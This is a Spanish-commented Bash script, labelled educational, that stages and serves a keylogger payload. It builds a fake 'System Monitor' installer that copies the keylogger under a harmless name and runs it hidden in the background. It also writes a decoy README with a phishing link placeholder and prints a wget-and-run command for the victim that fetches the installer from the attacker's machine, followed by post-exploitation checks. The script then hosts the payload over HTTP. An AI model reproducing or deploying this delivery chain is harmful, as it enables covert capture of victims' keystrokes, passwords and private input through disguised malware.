#!/bin/bash
# delivery_server.sh
# Servidor de entrega de payload para práctica educativa
# Uso: ./delivery_server.sh

set -e

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${GREEN}[*] Servidor de Entrega - Keylogger Educativo${NC}"
echo -e "${YELLOW}[!] Solo para uso en entornos autorizados${NC}\n"

# Verificar que el keylogger esté compilado
if [ ! -f "x11_keylogger" ]; then
    echo -e "${RED}[!] Error: x11_keylogger no encontrado${NC}"
    echo "[*] Compilando primero..."
    make
fi

# Crear directorio de entrega
DELIVERY_DIR="delivery_payload"
mkdir -p "$DELIVERY_DIR"

# Copiar binario
cp x11_keylogger "$DELIVERY_DIR/"

# Crear script de instalación "legítimo"
cat > "$DELIVERY_DIR/install_system_monitor.sh" <<'EOF'
#!/bin/bash
# Script de instalación de "System Monitor" (PAYLOAD EDUCATIVO)
# Este script simula un instalador legítimo pero ejecuta el keylogger

echo "[*] Instalando System Monitor..."
echo "[*] Verificando dependencias..."
sleep 1

# Verificar librerías X11
if ! dpkg -l | grep -q libx11-6; then
    echo "[!] Instalando dependencias..."
    sudo apt-get update && sudo apt-get install -y libx11-dev libxtst-dev
fi

# Copiar binario a ubicación "legítima"
INSTALL_DIR="$HOME/.local/bin"
mkdir -p "$INSTALL_DIR"
cp x11_keylogger "$INSTALL_DIR/system-monitor"

# Dar permisos de ejecución
chmod +x "$INSTALL_DIR/system-monitor"

echo "[*] Instalación completada."
echo "[*] Iniciando System Monitor..."

# Ejecutar el keylogger en background
cd "$INSTALL_DIR"
nohup ./system-monitor > /dev/null 2>&1 &

echo "[*] System Monitor ejecutándose en background (PID: $!)"
echo "[*] Para detener: pkill -f system-monitor"
EOF

chmod +x "$DELIVERY_DIR/install_system_monitor.sh"

# Crear README atractivo
cat > "$DELIVERY_DIR/README.txt" <<'EOF'
===========================================
   SYSTEM MONITOR - Herramienta de Análisis
===========================================

Esta herramienta monitorea el rendimiento de tu sistema X11.

INSTALACIÓN:
1. Ejecutar: ./install_system_monitor.sh
2. El monitor se ejecutará en background

CARACTERÍSTICAS:
- Monitoreo de eventos del sistema
- Bajo consumo de recursos
- Compatible con X11

Para más información, visite: [URL_PHISHING_EDUCATIVO]
EOF

# Obtener IP del atacante
ATTACKER_IP=$(ip addr show | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -n1)

if [ -z "$ATTACKER_IP" ]; then
    ATTACKER_IP="<TU_IP_AQUI>"
fi

echo -e "${GREEN}[*] Payload preparado en: $DELIVERY_DIR/${NC}"
echo -e "${GREEN}[*] Iniciando servidor HTTP en puerto 8080...${NC}"
echo ""
echo -e "${YELLOW}=== INSTRUCCIONES PARA LA VÍCTIMA ===${NC}"
echo ""
echo "En el sistema objetivo, ejecutar:"
echo ""
echo -e "${GREEN}# Opción 1: Descarga y ejecución directa${NC}"
echo "wget http://$ATTACKER_IP:8080/install_system_monitor.sh -O /tmp/install.sh && bash /tmp/install.sh"
echo ""
echo -e "${GREEN}# Opción 2: Descarga manual${NC}"
echo "wget http://$ATTACKER_IP:8080/install_system_monitor.sh"
echo "chmod +x install_system_monitor.sh"
echo "./install_system_monitor.sh"
echo ""
echo -e "${YELLOW}=== VERIFICACIÓN POST-EXPLOTACIÓN ===${NC}"
echo "ps aux | grep system-monitor"
echo "tail -f keylog.txt"
echo ""

# Iniciar servidor HTTP con Python
cd "$DELIVERY_DIR"
echo -e "${GREEN}[*] Servidor activo en http://$ATTACKER_IP:8080${NC}"
echo -e "${YELLOW}[!] Presiona Ctrl+C para detener${NC}"
echo ""

# Detectar versión de Python
if command -v python3 &> /dev/null; then
    python3 -m http.server 8080
elif command -v python &> /dev/null; then
    python -m SimpleHTTPServer 8080
else
    echo -e "${RED}[!] Python no encontrado. Instalar python3.${NC}"
    exit 1
fi
